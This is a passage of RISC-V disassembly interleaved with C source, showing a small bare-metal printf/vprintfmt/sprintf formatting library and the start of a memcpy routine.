    80001ec4:	fff7871b          	addiw	a4,a5,-1
    80001ec8:	fee42623          	sw	a4,-20(s0)
    80001ecc:	faf048e3          	bgtz	a5,80001e7c <printnum+0xa2>
}
    80001ed0:	0001                	nop
    80001ed2:	0001                	nop
    80001ed4:	60b6                	ld	ra,328(sp)
    80001ed6:	6416                	ld	s0,320(sp)
    80001ed8:	6171                	addi	sp,sp,336
    80001eda:	8082                	ret

0000000080001edc <getuint>:

static unsigned long long getuint(va_list *ap, int lflag)
{
    80001edc:	1101                	addi	sp,sp,-32
    80001ede:	ec22                	sd	s0,24(sp)
    80001ee0:	1000                	addi	s0,sp,32
    80001ee2:	fea43423          	sd	a0,-24(s0)
    80001ee6:	87ae                	mv	a5,a1
    80001ee8:	fef42223          	sw	a5,-28(s0)
  if (lflag >= 2)
    80001eec:	fe442783          	lw	a5,-28(s0)
    80001ef0:	0007871b          	sext.w	a4,a5
    80001ef4:	4785                	li	a5,1
    80001ef6:	00e7dc63          	bge	a5,a4,80001f0e <getuint+0x32>
    return va_arg(*ap, unsigned long long);
    80001efa:	fe843783          	ld	a5,-24(s0)
    80001efe:	639c                	ld	a5,0(a5)
    80001f00:	00878693          	addi	a3,a5,8
    80001f04:	fe843703          	ld	a4,-24(s0)
    80001f08:	e314                	sd	a3,0(a4)
    80001f0a:	639c                	ld	a5,0(a5)
    80001f0c:	a815                	j	80001f40 <getuint+0x64>
  else if (lflag)
    80001f0e:	fe442783          	lw	a5,-28(s0)
    80001f12:	2781                	sext.w	a5,a5
    80001f14:	cb99                	beqz	a5,80001f2a <getuint+0x4e>
    return va_arg(*ap, unsigned long);
    80001f16:	fe843783          	ld	a5,-24(s0)
    80001f1a:	639c                	ld	a5,0(a5)
    80001f1c:	00878693          	addi	a3,a5,8
    80001f20:	fe843703          	ld	a4,-24(s0)
    80001f24:	e314                	sd	a3,0(a4)
    80001f26:	639c                	ld	a5,0(a5)
    80001f28:	a821                	j	80001f40 <getuint+0x64>
  else
    return va_arg(*ap, unsigned int);
    80001f2a:	fe843783          	ld	a5,-24(s0)
    80001f2e:	639c                	ld	a5,0(a5)
    80001f30:	00878693          	addi	a3,a5,8
    80001f34:	fe843703          	ld	a4,-24(s0)
    80001f38:	e314                	sd	a3,0(a4)
    80001f3a:	439c                	lw	a5,0(a5)
    80001f3c:	1782                	slli	a5,a5,0x20
    80001f3e:	9381                	srli	a5,a5,0x20
}
    80001f40:	853e                	mv	a0,a5
    80001f42:	6462                	ld	s0,24(sp)
    80001f44:	6105                	addi	sp,sp,32
    80001f46:	8082                	ret

0000000080001f48 <getint>:

static long long getint(va_list *ap, int lflag)
{
    80001f48:	1101                	addi	sp,sp,-32
    80001f4a:	ec22                	sd	s0,24(sp)
    80001f4c:	1000                	addi	s0,sp,32
    80001f4e:	fea43423          	sd	a0,-24(s0)
    80001f52:	87ae                	mv	a5,a1
    80001f54:	fef42223          	sw	a5,-28(s0)
  if (lflag >= 2)
    80001f58:	fe442783          	lw	a5,-28(s0)
    80001f5c:	0007871b          	sext.w	a4,a5
    80001f60:	4785                	li	a5,1
    80001f62:	00e7dc63          	bge	a5,a4,80001f7a <getint+0x32>
    return va_arg(*ap, long long);
    80001f66:	fe843783          	ld	a5,-24(s0)
    80001f6a:	639c                	ld	a5,0(a5)
    80001f6c:	00878693          	addi	a3,a5,8
    80001f70:	fe843703          	ld	a4,-24(s0)
    80001f74:	e314                	sd	a3,0(a4)
    80001f76:	639c                	ld	a5,0(a5)
    80001f78:	a805                	j	80001fa8 <getint+0x60>
  else if (lflag)
    80001f7a:	fe442783          	lw	a5,-28(s0)
    80001f7e:	2781                	sext.w	a5,a5
    80001f80:	cb99                	beqz	a5,80001f96 <getint+0x4e>
    return va_arg(*ap, long);
    80001f82:	fe843783          	ld	a5,-24(s0)
    80001f86:	639c                	ld	a5,0(a5)
    80001f88:	00878693          	addi	a3,a5,8
    80001f8c:	fe843703          	ld	a4,-24(s0)
    80001f90:	e314                	sd	a3,0(a4)
    80001f92:	639c                	ld	a5,0(a5)
    80001f94:	a811                	j	80001fa8 <getint+0x60>
  else
    return va_arg(*ap, int);
    80001f96:	fe843783          	ld	a5,-24(s0)
    80001f9a:	639c                	ld	a5,0(a5)
    80001f9c:	00878693          	addi	a3,a5,8
    80001fa0:	fe843703          	ld	a4,-24(s0)
    80001fa4:	e314                	sd	a3,0(a4)
    80001fa6:	439c                	lw	a5,0(a5)
}
    80001fa8:	853e                	mv	a0,a5
    80001faa:	6462                	ld	s0,24(sp)
    80001fac:	6105                	addi	sp,sp,32
    80001fae:	8082                	ret

0000000080001fb0 <vprintfmt>:

static void vprintfmt(void (*putch)(int, void**), void **putdat, const char *fmt, va_list ap)
{
    80001fb0:	7159                	addi	sp,sp,-112
    80001fb2:	f486                	sd	ra,104(sp)
    80001fb4:	f0a2                	sd	s0,96(sp)
    80001fb6:	eca6                	sd	s1,88(sp)
    80001fb8:	e8ca                	sd	s2,80(sp)
    80001fba:	1880                	addi	s0,sp,112
    80001fbc:	faa43423          	sd	a0,-88(s0)
    80001fc0:	fab43023          	sd	a1,-96(s0)
    80001fc4:	f8c43c23          	sd	a2,-104(s0)
    80001fc8:	f8d43823          	sd	a3,-112(s0)
  unsigned long long num;
  int base, lflag, width, precision, altflag;
  char padc;

  while (1) {
    while ((ch = *(unsigned char *) fmt) != '%') {
    80001fcc:	a831                	j	80001fe8 <vprintfmt+0x38>
      if (ch == '\0')
    80001fce:	32048963          	beqz	s1,80002300 <vprintfmt+0x350>
        return;
      fmt++;
    80001fd2:	f9843783          	ld	a5,-104(s0)
    80001fd6:	0785                	addi	a5,a5,1
    80001fd8:	f8f43c23          	sd	a5,-104(s0)
      putch(ch, putdat);
    80001fdc:	fa843783          	ld	a5,-88(s0)
    80001fe0:	fa043583          	ld	a1,-96(s0)
    80001fe4:	8526                	mv	a0,s1
    80001fe6:	9782                	jalr	a5
    while ((ch = *(unsigned char *) fmt) != '%') {
    80001fe8:	f9843783          	ld	a5,-104(s0)
    80001fec:	0007c783          	lbu	a5,0(a5)
    80001ff0:	0007849b          	sext.w	s1,a5
    80001ff4:	8726                	mv	a4,s1
    80001ff6:	02500793          	li	a5,37
    80001ffa:	fcf71ae3          	bne	a4,a5,80001fce <vprintfmt+0x1e>
    }
    fmt++;
    80001ffe:	f9843783          	ld	a5,-104(s0)
    80002002:	0785                	addi	a5,a5,1
    80002004:	f8f43c23          	sd	a5,-104(s0)

    // Process a %-escape sequence
    last_fmt = fmt;
    80002008:	f9843783          	ld	a5,-104(s0)
    8000200c:	faf43c23          	sd	a5,-72(s0)
    padc = ' ';
    80002010:	02000793          	li	a5,32
    80002014:	fcf403a3          	sb	a5,-57(s0)
    width = -1;
    80002018:	57fd                	li	a5,-1
    8000201a:	fcf42623          	sw	a5,-52(s0)
    precision = -1;
    8000201e:	57fd                	li	a5,-1
    80002020:	fcf42423          	sw	a5,-56(s0)
    lflag = 0;
    80002024:	fc042823          	sw	zero,-48(s0)
    altflag = 0;
    80002028:	fa042a23          	sw	zero,-76(s0)
  reswitch:
    switch (ch = *(unsigned char *) fmt++) {
    8000202c:	f9843783          	ld	a5,-104(s0)
    80002030:	00178713          	addi	a4,a5,1
    80002034:	f8e43c23          	sd	a4,-104(s0)
    80002038:	0007c783          	lbu	a5,0(a5)
    8000203c:	0007849b          	sext.w	s1,a5
    80002040:	fdd4869b          	addiw	a3,s1,-35
    80002044:	0006871b          	sext.w	a4,a3
    80002048:	05500793          	li	a5,85
    8000204c:	28e7ed63          	bltu	a5,a4,800022e6 <vprintfmt+0x336>
    80002050:	02069793          	slli	a5,a3,0x20
    80002054:	9381                	srli	a5,a5,0x20
    80002056:	00279713          	slli	a4,a5,0x2
    8000205a:	00001797          	auipc	a5,0x1
    8000205e:	96678793          	addi	a5,a5,-1690 # 800029c0 <atol+0x28a>
    80002062:	97ba                	add	a5,a5,a4
    80002064:	439c                	lw	a5,0(a5)
    80002066:	0007871b          	sext.w	a4,a5
    8000206a:	00001797          	auipc	a5,0x1
    8000206e:	95678793          	addi	a5,a5,-1706 # 800029c0 <atol+0x28a>
    80002072:	97ba                	add	a5,a5,a4
    80002074:	8782                	jr	a5

    // flag to pad on the right
    case '-':
      padc = '-';
    80002076:	02d00793          	li	a5,45
    8000207a:	fcf403a3          	sb	a5,-57(s0)
      goto reswitch;
    8000207e:	b77d                	j	8000202c <vprintfmt+0x7c>
      
    // flag to pad with 0's instead of spaces
    case '0':
      padc = '0';
    80002080:	03000793          	li	a5,48
    80002084:	fcf403a3          	sb	a5,-57(s0)
      goto reswitch;
    80002088:	b755                	j	8000202c <vprintfmt+0x7c>
    case '5':
    case '6':
    case '7':
    case '8':
    case '9':
      for (precision = 0; ; ++fmt) {
    8000208a:	fc042423          	sw	zero,-56(s0)
        precision = precision * 10 + ch - '0';
    8000208e:	fc842703          	lw	a4,-56(s0)
    80002092:	87ba                	mv	a5,a4
    80002094:	0027979b          	slliw	a5,a5,0x2
    80002098:	9fb9                	addw	a5,a5,a4
    8000209a:	0017979b          	slliw	a5,a5,0x1
    8000209e:	2781                	sext.w	a5,a5
    800020a0:	9fa5                	addw	a5,a5,s1
    800020a2:	2781                	sext.w	a5,a5
    800020a4:	fd07879b          	addiw	a5,a5,-48
    800020a8:	fcf42423          	sw	a5,-56(s0)
        ch = *fmt;
    800020ac:	f9843783          	ld	a5,-104(s0)
    800020b0:	0007c783          	lbu	a5,0(a5)
    800020b4:	0007849b          	sext.w	s1,a5
        if (ch < '0' || ch > '9')
    800020b8:	8726                	mv	a4,s1
    800020ba:	02f00793          	li	a5,47
    800020be:	04e7d363          	bge	a5,a4,80002104 <vprintfmt+0x154>
    800020c2:	8726                	mv	a4,s1
    800020c4:	03900793          	li	a5,57
    800020c8:	02e7ce63          	blt	a5,a4,80002104 <vprintfmt+0x154>
      for (precision = 0; ; ++fmt) {
    800020cc:	f9843783          	ld	a5,-104(s0)
    800020d0:	0785                	addi	a5,a5,1
    800020d2:	f8f43c23          	sd	a5,-104(s0)
        precision = precision * 10 + ch - '0';
    800020d6:	bf65                	j	8000208e <vprintfmt+0xde>
          break;
      }
      goto process_precision;

    case '*':
      precision = va_arg(ap, int);
    800020d8:	f9043783          	ld	a5,-112(s0)
    800020dc:	00878713          	addi	a4,a5,8
    800020e0:	f8e43823          	sd	a4,-112(s0)
    800020e4:	439c                	lw	a5,0(a5)
    800020e6:	fcf42423          	sw	a5,-56(s0)
      goto process_precision;
    800020ea:	a831                	j	80002106 <vprintfmt+0x156>

    case '.':
      if (width < 0)
    800020ec:	fcc42783          	lw	a5,-52(s0)
    800020f0:	2781                	sext.w	a5,a5
    800020f2:	f207dde3          	bgez	a5,8000202c <vprintfmt+0x7c>
        width = 0;
    800020f6:	fc042623          	sw	zero,-52(s0)
      goto reswitch;
    800020fa:	bf0d                	j	8000202c <vprintfmt+0x7c>

    case '#':
      altflag = 1;
    800020fc:	4785                	li	a5,1
    800020fe:	faf42a23          	sw	a5,-76(s0)
      goto reswitch;
    80002102:	b72d                	j	8000202c <vprintfmt+0x7c>
      goto process_precision;
    80002104:	0001                	nop

    process_precision:
      if (width < 0)
    80002106:	fcc42783          	lw	a5,-52(s0)
    8000210a:	2781                	sext.w	a5,a5
    8000210c:	f207d0e3          	bgez	a5,8000202c <vprintfmt+0x7c>
        width = precision, precision = -1;
    80002110:	fc842783          	lw	a5,-56(s0)
    80002114:	fcf42623          	sw	a5,-52(s0)
    80002118:	57fd                	li	a5,-1
    8000211a:	fcf42423          	sw	a5,-56(s0)
      goto reswitch;
    8000211e:	b739                	j	8000202c <vprintfmt+0x7c>

    // long flag (doubled for long long)
    case 'l':
      lflag++;
    80002120:	fd042783          	lw	a5,-48(s0)
    80002124:	2785                	addiw	a5,a5,1
    80002126:	fcf42823          	sw	a5,-48(s0)
      goto reswitch;
    8000212a:	b709                	j	8000202c <vprintfmt+0x7c>

    // character
    case 'c':
      putch(va_arg(ap, int), putdat);
    8000212c:	f9043783          	ld	a5,-112(s0)
    80002130:	00878713          	addi	a4,a5,8
    80002134:	f8e43823          	sd	a4,-112(s0)
    80002138:	439c                	lw	a5,0(a5)
    8000213a:	fa843703          	ld	a4,-88(s0)
    8000213e:	fa043583          	ld	a1,-96(s0)
    80002142:	853e                	mv	a0,a5
    80002144:	9702                	jalr	a4
      break;
    80002146:	aa65                	j	800022fe <vprintfmt+0x34e>

    // string
    case 's':
      if ((p = va_arg(ap, char *)) == NULL)
    80002148:	f9043783          	ld	a5,-112(s0)
    8000214c:	00878713          	addi	a4,a5,8
    80002150:	f8e43823          	sd	a4,-112(s0)
    80002154:	0007b903          	ld	s2,0(a5)
    80002158:	00091663          	bnez	s2,80002164 <vprintfmt+0x1b4>
        p = "(null)";
    8000215c:	00001917          	auipc	s2,0x1
    80002160:	85c90913          	addi	s2,s2,-1956 # 800029b8 <atol+0x282>
      if (width > 0 && padc != '-')
    80002164:	fcc42783          	lw	a5,-52(s0)
    80002168:	2781                	sext.w	a5,a5
    8000216a:	06f05a63          	blez	a5,800021de <vprintfmt+0x22e>
    8000216e:	fc744783          	lbu	a5,-57(s0)
    80002172:	0ff7f713          	andi	a4,a5,255
    80002176:	02d00793          	li	a5,45
    8000217a:	06f70263          	beq	a4,a5,800021de <vprintfmt+0x22e>
        for (width -= strnlen(p, precision); width > 0; width--)
    8000217e:	fcc42483          	lw	s1,-52(s0)
    80002182:	fc842783          	lw	a5,-56(s0)
    80002186:	85be                	mv	a1,a5
    80002188:	854a                	mv	a0,s2
    8000218a:	4a4000ef          	jal	ra,8000262e <strnlen>
    8000218e:	87aa                	mv	a5,a0
    80002190:	2781                	sext.w	a5,a5
    80002192:	40f487bb          	subw	a5,s1,a5
    80002196:	2781                	sext.w	a5,a5
    80002198:	fcf42623          	sw	a5,-52(s0)
    8000219c:	a839                	j	800021ba <vprintfmt+0x20a>
          putch(padc, putdat);
    8000219e:	fc744783          	lbu	a5,-57(s0)
    800021a2:	2781                	sext.w	a5,a5
    800021a4:	fa843703          	ld	a4,-88(s0)
    800021a8:	fa043583          	ld	a1,-96(s0)
    800021ac:	853e                	mv	a0,a5
    800021ae:	9702                	jalr	a4
        for (width -= strnlen(p, precision); width > 0; width--)
    800021b0:	fcc42783          	lw	a5,-52(s0)
    800021b4:	37fd                	addiw	a5,a5,-1
    800021b6:	fcf42623          	sw	a5,-52(s0)
    800021ba:	fcc42783          	lw	a5,-52(s0)
    800021be:	2781                	sext.w	a5,a5
    800021c0:	fcf04fe3          	bgtz	a5,8000219e <vprintfmt+0x1ee>
      for (; (ch = *p) != '\0' && (precision < 0 || --precision >= 0); width--) {
    800021c4:	a829                	j	800021de <vprintfmt+0x22e>
        putch(ch, putdat);
    800021c6:	fa843783          	ld	a5,-88(s0)
    800021ca:	fa043583          	ld	a1,-96(s0)
    800021ce:	8526                	mv	a0,s1
    800021d0:	9782                	jalr	a5
        p++;
    800021d2:	0905                	addi	s2,s2,1
      for (; (ch = *p) != '\0' && (precision < 0 || --precision >= 0); width--) {
    800021d4:	fcc42783          	lw	a5,-52(s0)
    800021d8:	37fd                	addiw	a5,a5,-1
    800021da:	fcf42623          	sw	a5,-52(s0)
    800021de:	00094783          	lbu	a5,0(s2)
    800021e2:	0007849b          	sext.w	s1,a5
    800021e6:	cc8d                	beqz	s1,80002220 <vprintfmt+0x270>
    800021e8:	fc842783          	lw	a5,-56(s0)
    800021ec:	2781                	sext.w	a5,a5
    800021ee:	fc07cce3          	bltz	a5,800021c6 <vprintfmt+0x216>
    800021f2:	fc842783          	lw	a5,-56(s0)
    800021f6:	37fd                	addiw	a5,a5,-1
    800021f8:	fcf42423          	sw	a5,-56(s0)
    800021fc:	fc842783          	lw	a5,-56(s0)
    80002200:	2781                	sext.w	a5,a5
    80002202:	fc07d2e3          	bgez	a5,800021c6 <vprintfmt+0x216>
      }
      for (; width > 0; width--)
    80002206:	a829                	j	80002220 <vprintfmt+0x270>
        putch(' ', putdat);
    80002208:	fa843783          	ld	a5,-88(s0)
    8000220c:	fa043583          	ld	a1,-96(s0)
    80002210:	02000513          	li	a0,32
    80002214:	9782                	jalr	a5
      for (; width > 0; width--)
    80002216:	fcc42783          	lw	a5,-52(s0)
    8000221a:	37fd                	addiw	a5,a5,-1
    8000221c:	fcf42623          	sw	a5,-52(s0)
    80002220:	fcc42783          	lw	a5,-52(s0)
    80002224:	2781                	sext.w	a5,a5
    80002226:	fef041e3          	bgtz	a5,80002208 <vprintfmt+0x258>
      break;
    8000222a:	a8d1                	j	800022fe <vprintfmt+0x34e>

    // (signed) decimal
    case 'd':
      num = getint(&ap, lflag);
    8000222c:	fd042703          	lw	a4,-48(s0)
    80002230:	f9040793          	addi	a5,s0,-112
    80002234:	85ba                	mv	a1,a4
    80002236:	853e                	mv	a0,a5
    80002238:	d11ff0ef          	jal	ra,80001f48 <getint>
    8000223c:	87aa                	mv	a5,a0
    8000223e:	fcf43c23          	sd	a5,-40(s0)
      if ((long long) num < 0) {
    80002242:	fd843783          	ld	a5,-40(s0)
    80002246:	0007df63          	bgez	a5,80002264 <vprintfmt+0x2b4>
        putch('-', putdat);
    8000224a:	fa843783          	ld	a5,-88(s0)
    8000224e:	fa043583          	ld	a1,-96(s0)
    80002252:	02d00513          	li	a0,45
    80002256:	9782                	jalr	a5
        num = -(long long) num;
    80002258:	fd843783          	ld	a5,-40(s0)
    8000225c:	40f007b3          	neg	a5,a5
    80002260:	fcf43c23          	sd	a5,-40(s0)
      }
      base = 10;
    80002264:	47a9                	li	a5,10
    80002266:	fcf42a23          	sw	a5,-44(s0)
      goto signed_number;
    8000226a:	a0b9                	j	800022b8 <vprintfmt+0x308>

    // unsigned decimal
    case 'u':
      base = 10;
    8000226c:	47a9                	li	a5,10
    8000226e:	fcf42a23          	sw	a5,-44(s0)
      goto unsigned_number;
    80002272:	a80d                	j	800022a4 <vprintfmt+0x2f4>

    // (unsigned) octal
    case 'o':
      // should do something with padding so it's always 3 octits
      base = 8;
    80002274:	47a1                	li	a5,8
    80002276:	fcf42a23          	sw	a5,-44(s0)
      goto unsigned_number;
    8000227a:	a02d                	j	800022a4 <vprintfmt+0x2f4>

    // pointer
    case 'p':
      static_assert(sizeof(long) == sizeof(void*));
      lflag = 1;
    8000227c:	4785                	li	a5,1
    8000227e:	fcf42823          	sw	a5,-48(s0)
      putch('0', putdat);
    80002282:	fa843783          	ld	a5,-88(s0)
    80002286:	fa043583          	ld	a1,-96(s0)
    8000228a:	03000513          	li	a0,48
    8000228e:	9782                	jalr	a5
      putch('x', putdat);
    80002290:	fa843783          	ld	a5,-88(s0)
    80002294:	fa043583          	ld	a1,-96(s0)
    80002298:	07800513          	li	a0,120
    8000229c:	9782                	jalr	a5
      /* fall through to 'x' */

    // (unsigned) hexadecimal
    case 'x':
      base = 16;
    8000229e:	47c1                	li	a5,16
    800022a0:	fcf42a23          	sw	a5,-44(s0)
    unsigned_number:
      num = getuint(&ap, lflag);
    800022a4:	fd042703          	lw	a4,-48(s0)
    800022a8:	f9040793          	addi	a5,s0,-112
    800022ac:	85ba                	mv	a1,a4
    800022ae:	853e                	mv	a0,a5
    800022b0:	c2dff0ef          	jal	ra,80001edc <getuint>
    800022b4:	fca43c23          	sd	a0,-40(s0)
    signed_number:
      printnum(putch, putdat, num, base, width, padc);
    800022b8:	fd442683          	lw	a3,-44(s0)
    800022bc:	fc744783          	lbu	a5,-57(s0)
    800022c0:	2781                	sext.w	a5,a5
    800022c2:	fcc42703          	lw	a4,-52(s0)
    800022c6:	fd843603          	ld	a2,-40(s0)
    800022ca:	fa043583          	ld	a1,-96(s0)
    800022ce:	fa843503          	ld	a0,-88(s0)
    800022d2:	b09ff0ef          	jal	ra,80001dda <printnum>
      break;
    800022d6:	a025                	j	800022fe <vprintfmt+0x34e>

    // escaped '%' character
    case '%':
      putch(ch, putdat);
    800022d8:	fa843783          	ld	a5,-88(s0)
    800022dc:	fa043583          	ld	a1,-96(s0)
    800022e0:	8526                	mv	a0,s1
    800022e2:	9782                	jalr	a5
      break;
    800022e4:	a829                	j	800022fe <vprintfmt+0x34e>
      
    // unrecognized escape sequence - just print it literally
    default:
      putch('%', putdat);
    800022e6:	fa843783          	ld	a5,-88(s0)
    800022ea:	fa043583          	ld	a1,-96(s0)
    800022ee:	02500513          	li	a0,37
    800022f2:	9782                	jalr	a5
      fmt = last_fmt;
    800022f4:	fb843783          	ld	a5,-72(s0)
    800022f8:	f8f43c23          	sd	a5,-104(s0)
      break;
    800022fc:	0001                	nop
    while ((ch = *(unsigned char *) fmt) != '%') {
    800022fe:	b1ed                	j	80001fe8 <vprintfmt+0x38>
        return;
    80002300:	0001                	nop
    }
  }
}
    80002302:	70a6                	ld	ra,104(sp)
    80002304:	7406                	ld	s0,96(sp)
    80002306:	64e6                	ld	s1,88(sp)
    80002308:	6946                	ld	s2,80(sp)
    8000230a:	6165                	addi	sp,sp,112
    8000230c:	8082                	ret

000000008000230e <printf>:

int printf(const char* fmt, ...)
{
    8000230e:	7159                	addi	sp,sp,-112
    80002310:	f406                	sd	ra,40(sp)
    80002312:	f022                	sd	s0,32(sp)
    80002314:	1800                	addi	s0,sp,48
    80002316:	fca43c23          	sd	a0,-40(s0)
    8000231a:	e40c                	sd	a1,8(s0)
    8000231c:	e810                	sd	a2,16(s0)
    8000231e:	ec14                	sd	a3,24(s0)
    80002320:	f018                	sd	a4,32(s0)
    80002322:	f41c                	sd	a5,40(s0)
    80002324:	03043823          	sd	a6,48(s0)
    80002328:	03143c23          	sd	a7,56(s0)
  va_list ap;
  va_start(ap, fmt);
    8000232c:	04040793          	addi	a5,s0,64
    80002330:	fcf43823          	sd	a5,-48(s0)
    80002334:	fd043783          	ld	a5,-48(s0)
    80002338:	fc878793          	addi	a5,a5,-56
    8000233c:	fef43423          	sd	a5,-24(s0)

  vprintfmt((void*)putchar, 0, fmt, ap);
    80002340:	fe843783          	ld	a5,-24(s0)
    80002344:	86be                	mv	a3,a5
    80002346:	fd843603          	ld	a2,-40(s0)
    8000234a:	4581                	li	a1,0
    8000234c:	00000517          	auipc	a0,0x0
    80002350:	98e50513          	addi	a0,a0,-1650 # 80001cda <putchar>
    80002354:	c5dff0ef          	jal	ra,80001fb0 <vprintfmt>

  va_end(ap);
  return 0; // incorrect return value, but who cares, anyway?
    80002358:	4781                	li	a5,0
}
    8000235a:	853e                	mv	a0,a5
    8000235c:	70a2                	ld	ra,40(sp)
    8000235e:	7402                	ld	s0,32(sp)
    80002360:	6165                	addi	sp,sp,112
    80002362:	8082                	ret

0000000080002364 <sprintf_putch.3105>:
  va_list ap;
  char* str0 = str;
  va_start(ap, fmt);

  void sprintf_putch(int ch, void** data)
  {
    80002364:	7139                	addi	sp,sp,-64
    80002366:	fc22                	sd	s0,56(sp)
    80002368:	0080                	addi	s0,sp,64
    8000236a:	87aa                	mv	a5,a0
    8000236c:	fcb43823          	sd	a1,-48(s0)
    80002370:	fcf42e23          	sw	a5,-36(s0)
    80002374:	fc743423          	sd	t2,-56(s0)
    char** pstr = (char**)data;
    80002378:	fd043783          	ld	a5,-48(s0)
    8000237c:	fef43423          	sd	a5,-24(s0)
    **pstr = ch;
    80002380:	fe843783          	ld	a5,-24(s0)
    80002384:	639c                	ld	a5,0(a5)
    80002386:	fdc42703          	lw	a4,-36(s0)
    8000238a:	0ff77713          	andi	a4,a4,255
    8000238e:	00e78023          	sb	a4,0(a5)
    (*pstr)++;
    80002392:	fe843783          	ld	a5,-24(s0)
    80002396:	639c                	ld	a5,0(a5)
    80002398:	00178713          	addi	a4,a5,1
    8000239c:	fe843783          	ld	a5,-24(s0)
    800023a0:	e398                	sd	a4,0(a5)
  }
    800023a2:	0001                	nop
    800023a4:	7462                	ld	s0,56(sp)
    800023a6:	6121                	addi	sp,sp,64
    800023a8:	8082                	ret

00000000800023aa <sprintf>:
{
    800023aa:	716d                	addi	sp,sp,-272
    800023ac:	ed86                	sd	ra,216(sp)
    800023ae:	e9a2                	sd	s0,208(sp)
    800023b0:	1180                	addi	s0,sp,224
    800023b2:	f2a43c23          	sd	a0,-200(s0)
    800023b6:	f2b43823          	sd	a1,-208(s0)
    800023ba:	e010                	sd	a2,0(s0)
    800023bc:	e414                	sd	a3,8(s0)
    800023be:	e818                	sd	a4,16(s0)
    800023c0:	ec1c                	sd	a5,24(s0)
    800023c2:	03043023          	sd	a6,32(s0)
    800023c6:	03143423          	sd	a7,40(s0)
int	feof (FILE *);
int	ferror (FILE *);
void    perror (const char *);
#ifndef _REENT_ONLY
FILE *	fopen (const char *__restrict _name, const char *__restrict _type);
int	sprintf (char *__restrict, const char *__restrict, ...)
    800023ca:	03040793          	addi	a5,s0,48
    800023ce:	f2f43423          	sd	a5,-216(s0)
    800023d2:	f2843783          	ld	a5,-216(s0)
    800023d6:	fcf43c23          	sd	a5,-40(s0)
    800023da:	f4840793          	addi	a5,s0,-184
    800023de:	f4840713          	addi	a4,s0,-184
    800023e2:	39700693          	li	a3,919
    800023e6:	c394                	sw	a3,0(a5)
    800023e8:	0183b6b7          	lui	a3,0x183b
    800023ec:	30368693          	addi	a3,a3,771 # 183b303 <_tbss_end+0x183b27f>
    800023f0:	c3d4                	sw	a3,4(a5)
    800023f2:	0103b6b7          	lui	a3,0x103b
    800023f6:	38368693          	addi	a3,a3,899 # 103b383 <_tbss_end+0x103b2ff>
    800023fa:	c794                	sw	a3,8(a5)
    800023fc:	000306b7          	lui	a3,0x30
    80002400:	06768693          	addi	a3,a3,103 # 30067 <_tbss_end+0x2ffe3>
    80002404:	c7d4                	sw	a3,12(a5)
    80002406:	eb98                	sd	a4,16(a5)
    80002408:	00000717          	auipc	a4,0x0
    8000240c:	f5c70713          	addi	a4,a4,-164 # 80002364 <sprintf_putch.3105>
    80002410:	ef98                	sd	a4,24(a5)
    80002412:	0000100f          	fence.i
  char* str0 = str;
    80002416:	f3843783          	ld	a5,-200(s0)
    8000241a:	fef43423          	sd	a5,-24(s0)
  va_start(ap, fmt);
    8000241e:	03040793          	addi	a5,s0,48
    80002422:	f2f43423          	sd	a5,-216(s0)
    80002426:	f2843783          	ld	a5,-216(s0)
    8000242a:	fd078793          	addi	a5,a5,-48
    8000242e:	fef43023          	sd	a5,-32(s0)

  vprintfmt(sprintf_putch, (void**)&str, fmt, ap);
    80002432:	fe043703          	ld	a4,-32(s0)
    80002436:	f4840793          	addi	a5,s0,-184
    8000243a:	853e                	mv	a0,a5
    8000243c:	f3840793          	addi	a5,s0,-200
    80002440:	86ba                	mv	a3,a4
    80002442:	f3043603          	ld	a2,-208(s0)
    80002446:	85be                	mv	a1,a5
    80002448:	b69ff0ef          	jal	ra,80001fb0 <vprintfmt>
  *str = 0;
    8000244c:	f3843783          	ld	a5,-200(s0)
    80002450:	00078023          	sb	zero,0(a5)

  va_end(ap);
  return str - str0;
    80002454:	f3843703          	ld	a4,-200(s0)
    80002458:	fe843783          	ld	a5,-24(s0)
    8000245c:	40f707b3          	sub	a5,a4,a5
    80002460:	2781                	sext.w	a5,a5
}
    80002462:	853e                	mv	a0,a5
    80002464:	60ee                	ld	ra,216(sp)
    80002466:	644e                	ld	s0,208(sp)
    80002468:	6151                	addi	sp,sp,272
    8000246a:	8082                	ret

000000008000246c <memcpy>:

void* memcpy(void* dest, const void* src, size_t len)
{
    8000246c:	715d                	addi	sp,sp,-80
    8000246e:	e4a2                	sd	s0,72(sp)
    80002470:	0880                	addi	s0,sp,80
    80002472:	fca43423          	sd	a0,-56(s0)
    80002476:	fcb43023          	sd	a1,-64(s0)
    8000247a:	fac43c23          	sd	a2,-72(s0)
  if ((((uintptr_t)dest | (uintptr_t)src | len) & (sizeof(uintptr_t)-1)) == 0) {
    8000247e:	fc843703          	ld	a4,-56(s0)
    80002482:	fc043783          	ld	a5,-64(s0)
    80002486:	8f5d                	or	a4,a4,a5
    80002488:	fb843783          	ld	a5,-72(s0)
    8000248c:	8fd9                	or	a5,a5,a4
    8000248e:	8b9d                	andi	a5,a5,7
    80002490:	e3b1                	bnez	a5,800024d4 <memcpy+0x68>
    const uintptr_t* s = src;
    80002492:	fc043783          	ld	a5,-64(s0)
    80002496:	fef43423          	sd	a5,-24(s0)
    uintptr_t *d = dest;
    8000249a:	fc843783          	ld	a5,-56(s0)
    8000249e:	fef43023          	sd	a5,-32(s0)
    while (d < (uintptr_t*)(dest + len))
    800024a2:	a839                	j	800024c0 <memcpy+0x54>
      *d++ = *s++;
    800024a4:	fe843703          	ld	a4,-24(s0)
    800024a8:	00870793          	addi	a5,a4,8
    800024ac:	fef43423          	sd	a5,-24(s0)
    800024b0:	fe043783          	ld	a5,-32(s0)
    800024b4:	00878693          	addi	a3,a5,8
    800024b8:	fed43023          	sd	a3,-32(s0)
    800024bc:	6318                	ld	a4,0(a4)
    800024be:	e398                	sd	a4,0(a5)
    while (d < (uintptr_t*)(dest + len))
    800024c0:	fc843703          	ld	a4,-56(s0)
    800024c4:	fb843783          	ld	a5,-72(s0)
    800024c8:	97ba                	add	a5,a5,a4
    800024ca:	fe043703          	ld	a4,-32(s0)
    800024ce:	fcf76be3          	bltu	a4,a5,800024a4 <memcpy+0x38>
    800024d2:	a099                	j	80002518 <memcpy+0xac>
  } else {
    const char* s = src;
    800024d4:	fc043783          	ld	a5,-64(s0)
    800024d8:	fcf43c23          	sd	a5,-40(s0)
    char *d = dest;
    800024dc:	fc843783          	ld	a5,-56(s0)
    800024e0:	fcf43823          	sd	a5,-48(s0)
    while (d < (char*)(dest + len))
    800024e4:	a00d                	j	80002506 <memcpy+0x9a>
      *d++ = *s++;
    800024e6:	fd843703          	ld	a4,-40(s0)
    800024ea:	00170793          	addi	a5,a4,1
    800024ee:	fcf43c23          	sd	a5,-40(s0)
